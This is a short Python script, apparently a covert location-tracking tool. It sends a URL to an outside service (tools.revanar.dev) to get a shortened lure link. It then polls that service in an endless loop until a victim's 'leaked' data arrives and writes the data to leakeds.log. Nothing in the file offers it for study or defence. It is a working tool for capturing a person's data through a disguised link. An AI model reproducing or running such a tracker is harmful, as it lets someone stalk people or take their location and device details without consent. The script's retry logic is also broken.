#!/usr/bin/env python3

from urllib.parse import urlparse
import requests
import os

def GpsTrack(shorten_url=None):
    req = requests.post("https://tools.revanar.dev/generate.php", headers={"User-Agent": "Track/1.0"}, data={"link": "{}".format(shorten_url)}).json()
    status = req["status"]

    link = ""

    if status == "success":
        link += req["link"]

    else:
        GpsTrack()

    print(f" * Short link: {link}")

    parse_url = urlparse(link)
    path = parse_url.path.split('/')
    while True:
        res = requests.get("https://tools.revanar.dev/check.php", headers={"User-Agent": "Track/1.1"}, params={"u": "{}".format(path[1])}).json()
        leaked = res["leaked"]

        if leaked == True:
            with open("leakeds.log", "a") as f:
                f.write(res["data"]+ os.linesep)

            break

        else:
            continue
